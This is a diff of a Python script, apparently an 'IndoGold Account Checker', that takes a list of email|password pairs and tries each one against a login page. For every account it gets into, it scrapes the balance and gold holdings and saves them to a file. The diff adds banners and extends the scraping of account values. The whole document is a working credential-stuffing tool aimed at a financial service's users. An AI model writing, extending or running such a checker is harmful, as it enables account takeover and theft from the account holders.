@@ -3,11 +3,15 @@
 #####..:[alert !]:..#####
 #this tool absolutely harom
 #DWYOR !
-import requests,sys,argparse
+  # Format result
+  # email|pass|saldo|emas jika akun pernah topup emas
+
+import requests,sys,argparse,os
+from art import *	
 from bs4 import BeautifulSoup as bs
 from sty import fg,rs
-
-argm = argparse.ArgumentParser()
+baner= fg(34)+'\t    '+art("american money2")+'\nStill Silent and get the Money\n\t'+fg.red+art('high five')+'\n'
+argm = argparse.ArgumentParser(description=art('happy')+'\nIndoGold Account Checker')
 argm.add_argument('-l','--list',help="list email+password with format email|pass",required=True)
 args = argm.parse_args()
 
@@ -15,6 +19,8 @@ def ijo(str):
 	return fg(34) + str + rs.fg
 def abang(str):
 	return fg.da_red + str + rs.fg
+def kuning(str):
+	return fg.li_yellow + str + rs.fg
 def simpen(result):
 	f = open('IndoGold-account.txt','a+')
 	f.write(result)
@@ -36,19 +42,40 @@ def cek(list):
 			p = session.post(host,headers=headers,data=payload).text
 			if 'Client Area' in p :
 				scrap = bs(p,'html.parser').find_all('div',{"class": "client-membership-child"})
+				# print(scrap)
+				# exit()
 				result = []
 				for a in scrap:
-					val = a.find_all('span')
-					for v in val:
-						result.append(v.contents[0])
-				print(ijo(f"[Not Bad][Email : {list[i][0]}][pass : {list[i][1]}][Saldo : {result[2]}]"))
-				r = list[i][0] +'|'+ list[i][1]+'|'+result[2]+'\n'
+					info = a.find_all('span')
+					gold = a.find_all('td',{'style':'text-align:right'})
+					for g in gold:
+						result.append(g.contents[0])
+					for v in info:
+						result.append(v.contents[0])				
+				if len(result) == 4:
+					print(ijo(f"[Not Bad][{list[i][0]}][{list[i][1]}][{result[0]}][{result[1]}][{result[2]}]"))
+					r = list[i][0] +'|'+ list[i][1]+'|'+result[2]+'\n'
+				elif len(result) == 5:
+					print(ijo(f"[Not Bad][{list[i][0]}][{list[i][1]}][{result[0]}][{result[1]}][{result[2]}][{result[4]}]"))
+					r = list[i][0] +'|'+ list[i][1]+'|'+result[2]+'|'+result[4]+'\n'
+				elif len(result) == 6:
+					if '\n' in result[3]:
+						print(ijo(f"[Not Bad][{list[i][0]}][{list[i][1]}][{result[0]}][{result[1]}][{result[2]}][{result[5]}]"))
+						r = list[i][0] +'|'+ list[i][1]+'|'+result[2]+'|'+result[5]+'\n'
+					else:
+						print(ijo(f"[Not Bad][{list[i][0]}][{list[i][1]}][{result[0]}][{result[1]}][{result[3]}][{result[5]}]"))
+						r = list[i][0] +'|'+ list[i][1]+'|'+result[3]+'|'+result[5]+'\n'
+				else:
+					print(ijo(f"[Not Bad][{list[i][0]}][{list[i][1]}]"+kuning("[alert !][coba cek emailnya manual mungkin dapet notif]")))
+					r = list[i][0] +'|'+ list[i][1]+'\n'
 				simpen(r)
 				session.get(out)
 			else:
 				print(abang(f"[Bad][Email : {list[i][0]}][pass : {list[i][1]}]"))
+		exit()
 def main():
 	try:
+		print(baner)
 		op = open(args.list,'r').readlines()
 		hps = [h.replace('\n','') for h in op]
 		list = [p.split('|') for p in hps]
@@ -58,4 +85,5 @@ def main():
 		sys.exit()
 
 if __name__ == "__main__":
+	os.system('clear')
 	main()
